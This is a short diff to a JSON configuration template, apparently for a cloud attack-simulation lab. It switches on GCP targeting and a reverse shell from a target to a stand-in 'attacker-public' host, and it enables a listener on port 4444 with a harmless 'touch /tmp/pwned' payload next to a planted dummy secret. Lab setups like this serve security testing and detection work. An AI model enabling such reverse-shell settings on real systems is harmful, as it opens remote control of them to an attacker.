@@ -5,7 +5,7 @@
       "deployment"           : "${ deployment }"
     },
     "gcp" : {
-      "enabled": false,
+      "enabled": true,
       "osconfig" : {
         "target": {
           "drop": {
@@ -36,7 +36,8 @@
               "env_secrets": ["SECRET=supersecret123"]
             },
             "reverse_shell": {
-              "enabled": false
+              "enabled": true,
+              "host_ip": "attacker-public-1-attacker-${ deployment }.${ dynu_dns_domain }"
             }
           },
           "listener": {
@@ -69,7 +70,7 @@
           },
           "responder": {
             "reverse_shell": {
-              "enabled": false,
+              "enabled": true,
               "listen_ip": "0.0.0.0",
               "listen_port": "4444",
               "payload": "touch /tmp/pwned"
